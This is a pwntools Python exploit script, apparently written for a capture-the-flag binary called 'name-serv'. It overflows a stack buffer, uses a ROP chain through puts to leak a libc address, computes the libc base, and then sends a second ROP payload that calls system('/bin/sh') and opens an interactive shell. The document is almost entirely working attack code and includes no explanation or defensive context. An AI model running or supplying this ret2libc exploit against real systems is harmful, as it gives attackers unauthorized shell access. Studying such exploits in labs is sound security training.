from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
b *main

'''.format(**locals())

# Binary filename
exe = './name-serv'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = 40

# Start program
io = start()

pop_rdi = p64(0x4006d3)
ret = p64(0x4004c6)

puts_plt = elf.plt.puts
puts_got = elf.got.puts

main = elf.symbols['main']

# Build the payload
payload = flat(
    b'A'*offset,
    # ret,
    pop_rdi,
    puts_got,
    puts_plt,
    main
)

# Send the payload
io.sendlineafter(b':', payload)

puts_libc = unpack(io.recvline().strip()[:6].ljust(8,b"\x00"))

info(f"leaked puts :{hex(puts_libc)}")
info(f"puts_plt : {hex(puts_plt)}")
info(f"puts_got : {hex(puts_got)}")

libc.address = puts_libc - libc.symbols.puts
info(f"libc base : {hex(libc.address)}")


system = libc.symbols.system
bin_sh = next(libc.search(b'/bin/sh\x00'))

success(f"libc system : {hex(system)}")
success(f"bin sh  : {hex(bin_sh)}")

payload = flat(
    b'A'*offset,
    ret,
    pop_rdi,
    bin_sh,
    system
)
io.sendlineafter(b':', payload)
# Got Shell?
io.interactive()
